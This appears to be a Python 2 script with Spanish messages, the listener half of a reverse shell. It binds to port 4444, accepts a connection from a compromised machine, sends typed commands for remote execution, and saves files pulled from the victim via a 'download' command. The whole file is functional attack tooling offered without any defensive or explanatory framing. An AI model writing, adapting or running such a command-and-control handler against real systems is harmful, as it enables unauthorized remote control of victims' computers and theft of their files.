import socket,json,base64


c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
c.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
c.bind(("localhost",4444))
c.listen(1)
print("[+]Esperando conexión...")

con,adr = c.accept()
print("[*]Conexión de {}".format(adr))
print("")

def send_data(data):
	data_j = json.dumps(data)
	con.send(data_j)
	
def receive_data():
	data = ""
	while True:
		try:
			data = data + con.recv(1024)
			return json.loads(data)
		except ValueError:
			continue

def ejecutar_remotamente(cmd):
	send_data(cmd)
	return receive_data()

def download(path,contenido):
	
	with open(path,"wb") as file:
		file.write(base64.b64decode(contenido))
		return "[+]Download sucessfully."
			
while True:
	command = raw_input(">> ")
	res = ejecutar_remotamente(command)
	if command[:8] == "download":
		res = download(command[9:],res)
	print(res)
